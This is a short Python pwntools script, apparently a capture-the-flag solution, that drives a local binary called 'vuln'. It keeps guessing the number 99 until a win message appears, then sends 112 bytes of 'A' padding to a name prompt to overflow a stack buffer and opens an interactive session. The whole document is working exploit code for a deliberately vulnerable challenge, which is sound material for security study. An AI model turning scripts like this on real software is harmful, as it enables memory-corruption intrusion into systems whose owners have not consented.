#!.venv/bin/python
from pwn import *

MAX_GUESS = 99
BUF_SIZE = 112  # due to 16 byte stack allignment in 64-bit
MAX_FGETS = 360
vuln = process('../vuln')

while (line := vuln.recvline()) != b'Congrats! You win! Your prize is this print statement!\n':
	if line == b'What number would you like to guess?\n':
		vuln.send(f'{MAX_GUESS}\r\n'.encode())
vuln.recvuntil(b'Name? ')

exploit = b'A' * (BUF_SIZE)
# exploit += b'\n'
print(exploit)
vuln.send(exploit)
vuln.interactive()
